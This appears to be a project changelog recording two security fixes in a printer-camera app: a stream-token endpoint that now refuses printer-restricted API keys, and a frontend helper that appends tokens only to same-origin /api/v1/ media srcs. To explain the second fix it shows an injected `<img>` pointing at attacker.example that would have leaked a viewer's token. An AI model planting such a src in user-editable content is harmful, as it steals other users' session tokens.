# Baseline Changelog — campaign 22 (camera wall + card hover dwell)

User-approved behavior changes made during the refactor campaign, each an
explicit exception to the campaign's zero-functionality-change rule. Every
entry names the task, what changed, which golden probe(s) / SURFACE.md
sections were re-recorded in the same commit, and the approval date.

Campaign 22 re-baselined this file at setup (2026-09-29). The entries of
campaigns 1–21 live in git history (`git log -p -- BASELINE-CHANGELOG.md`
before the `chore(refactor-loop): setup` commit tagged `refactor-base`) and
in each campaign's archived FINAL_REPORT.md.

## T-001 — create_stream_token refuses printer-restricted API keys (user-approved 2026-09-29)

`POST /api/v1/printers/camera/stream-token` now returns 403 when the caller is
an API key with `printer_ids` set (auth enabled). The minted token carries no
printer allowlist, so such a key previously got a token that opened every
printer's `/camera/stream` and `/camera/snapshot`. JWT users, unrestricted
keys and the auth-disabled path are unchanged. The key is resolved via the
existing `_grid_stream_api_key_if_auth_enabled` dependency.

- Golden probes re-recorded: none (13/13 match; no `responses=` declared, so
  `camera-contract` / `app-openapi-index` are unchanged).
- SURFACE.md sections regenerated: "Route signatures — grid stream, hub
  status, stream token, stream, stop" (new `api_key` parameter on
  `create_stream_token`).

## T-002 — only rewrite same-origin /api/v1/ media srcs with the stream token (user-approved 2026-09-29)

`frontend/src/hooks/useCameraStreamToken.ts` gained a module-private
`isSameOriginApiV1Src(src)` helper (resolves `src` against
`window.location.href`, returns true only when the resolved URL's origin
matches the page's origin and its pathname starts with `/api/v1/`; an
unparseable `src` returns `false` without throwing). It now gates all three
places that append or recognise a stream token on an `<img>`/`<video>` src:
`isCameraUrl` (only classifies a same-origin `/api/v1/` src containing
`/camera/` as a camera URL), `rewriteMediaSrcWithToken` (skips appending
`?token=` to any src that fails the gate), and the capture-phase `load`-error
listener in `useStreamTokenSync` (skips srcs that fail the gate when
deciding whether to retry/clear a token). Relative srcs are unaffected: they
still resolve against `window.location.href` and are rewritten exactly as
before. The commit was flagged by the blind verifier as an observable
behavior change with no changelog entry (at BASE, a cross-origin src such as
`https://attacker.example/api/v1/x` received the viewer's camera or media
token appended as `?token=...`); the user approved it after that flag, on
2026-09-29, as the fix for that disclosure. The risk is real: user-editable
content (e.g. project notes sanitized with DOMPurify, which keeps `<img
src>`) can embed an attacker-controlled `<img src="https://attacker.example/
api/v1/...">`, and before this change the viewer's live token would be
appended to it and sent to that third-party origin on load. What is
unchanged: every URL the app itself constructs for camera/media elements is
relative or already same-origin, so normal camera grids, snapshots, and
media playback still get their token exactly as before; only
attacker-controlled cross-origin srcs stop receiving a token. This addendum
commit is the changelog entry for commit 702605c33 "refactor(loop-1): T-002
only rewrite same-origin /api/v1/ media srcs with the stream token".

- Golden probes re-recorded: none (13/13 match).
- SURFACE.md sections regenerated: none.
